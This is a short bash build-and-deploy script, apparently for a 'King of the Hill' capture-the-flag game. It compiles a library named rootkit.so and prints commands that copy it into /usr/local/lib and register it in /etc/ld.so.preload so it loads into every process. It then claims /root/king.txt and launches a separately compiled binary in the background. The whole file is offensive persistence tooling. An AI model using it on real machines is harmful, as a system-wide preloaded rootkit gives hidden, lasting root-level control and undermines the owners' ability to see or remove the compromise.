#!/bin/bash

gcc -shared -o rootkit.so -fPIC rootkit.c -ldl
echo 'cp ./rootkit.so /usr/local/lib/rootkit.so'
echo 'echo /usr/local/lib/rootkit.so > /etc/ld.so.preload'
echo "echo profxadke > /root/king.txt"
gcc -static kothv4.c -o koth.o
echo "./koth.o & disown"
